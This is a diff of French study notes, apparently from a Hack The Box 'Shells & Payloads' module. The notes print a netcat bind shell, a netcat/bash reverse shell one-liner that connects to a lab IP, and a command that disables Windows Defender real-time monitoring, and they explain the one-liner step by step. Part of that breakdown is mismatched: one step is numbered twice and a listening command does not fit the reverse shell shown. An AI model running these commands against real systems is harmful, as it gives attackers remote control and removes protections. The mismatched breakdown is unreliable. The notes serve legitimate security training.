@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T19:36:07.904Z
+date: 2025-05-17T19:44:29.287Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -121,24 +121,6 @@ Exemple pour lier un shell Bash à la session TCP avec nc et un canal nommé FIF
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip cible> <port cible> > /tmp/f
 ```
 
-1. **`rm -f /tmp/f`**
-   Supprime le fichier `/tmp/f` s’il existe déjà.
-
-2. **`mkfifo /tmp/f`**
-   Crée un pipe nommé (FIFO) pour permettre la communication entre processus.
-
-3. **`cat /tmp/f | /bin/bash -i`**
-   Envoie les commandes lues du pipe à un shell interactif Bash.
-
-4. **`2>&1`**
-   Redirige les erreurs vers la sortie standard pour tout récupérer.
-
-5. **`| nc -l 10.129.41.200 7777`**
-   Envoie la sortie du shell à Netcat, qui écoute sur l’IP et le port donnés.
-
-6. **`> /tmp/f`**
-   Redirige ce que Netcat reçoit vers le pipe.
-
 La commande ci-dessu est donc considérée comme le payload.
 
 Nous avons établi avec succès une session bind shell. Cela a été réalisé sans aucune mesure de sécurité en place (comme les routeurs avec NAT, pare-feux matériels, WAF, IDS/IPS, pare-feux système, antivirus, ou mécanismes d'authentification).
@@ -187,5 +169,34 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 La **payload** est le contenu principal d’un message. En informatique, c’est l’information utile transmise. En **cybersécurité**, elle désigne un code ou une commande exploitant une faille, souvent à des fins malveillantes.
 
+
+## One-Liners Examined
+
+### Netcat/Bash Reverse Shell One-liner
+
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
+```
+
+1. **`rm -f /tmp/f;`**
+   Supprime le fichier `/tmp/f` s’il existe déjà.
+
+2. **`mkfifo /tmp/f;`**
+   Crée un fichier [pipe nommé (FIFO)](https://man7.org/linux/man-pages/man7/fifo.7.html) pour permettre la communication entre processus.
+
+3. **`cat /tmp/f |`**
+   Concatène le fichier nommé **/tmp/f** (un FIFO), et transmet sa sortie via un pipe à la commande suivante.
+
+4. **`/bin/bash -i 2>&1 |`**
+		Spécifie l'interpréteur de commandes (avec -i pour le rendre interactif). L'expression 2>&1 redirige le flux d'erreur standard (2) et le flux de sortie standard (1) vers la commande qui suit le symbole | (pipe).
+
+4. **`2>&1`**
+   Redirige les erreurs vers la sortie standard pour tout récupérer.
+
+5. **`| nc -l 10.129.41.200 7777`**
+   Envoie la sortie du shell à Netcat, qui écoute sur l’IP et le port donnés.
+
+6. **`> /tmp/f`**
+   Redirige ce que Netcat reçoit vers le pipe.
 
 
